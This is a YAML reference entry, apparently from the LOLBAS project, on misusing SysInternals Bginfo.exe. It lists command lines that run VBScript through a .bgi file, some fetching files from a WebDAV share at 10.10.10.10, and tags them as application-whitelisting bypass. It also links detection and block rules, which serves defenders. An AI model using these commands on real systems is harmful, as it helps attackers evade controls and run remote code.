---
Name: Bginfo.exe
Description: Background Information Utility included with SysInternals Suite
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: bginfo.exe bginfo.bgi /popup /nolicprompt
    Description: Execute VBscript code that is referenced within the bginfo.bgi file.
    Usecase: Local execution of VBScript
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows
  - Command: bginfo.exe bginfo.bgi /popup /nolicprompt
    Description: Execute VBscript code that is referenced within the bginfo.bgi file.
    Usecase: Local execution of VBScript
    Category: AWL Bypass
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows
  - Command: \\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt
    Usecase: Remote execution of VBScript
    Description: Execute bginfo.exe from a WebDAV server.
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows
  - Command: \\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt
    Usecase: Remote execution of VBScript
    Description: Execute bginfo.exe from a WebDAV server.
    Category: AWL Bypass
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows
  - Command: \\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt
    Usecase: Remote execution of VBScript
    Description: This style of execution may not longer work due to patch.
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows
  - Command: \\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt
    Usecase: Remote execution of VBScript
    Description: This style of execution may not longer work due to patch.
    Category: AWL Bypass
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows
Full_Path:
  - Path: No fixed path
Code_Sample:
  - Code:
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_bginfo.yml
  - Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
  - Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
  - BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
Resources:
  - Link: https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/
Acknowledgement:
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
---
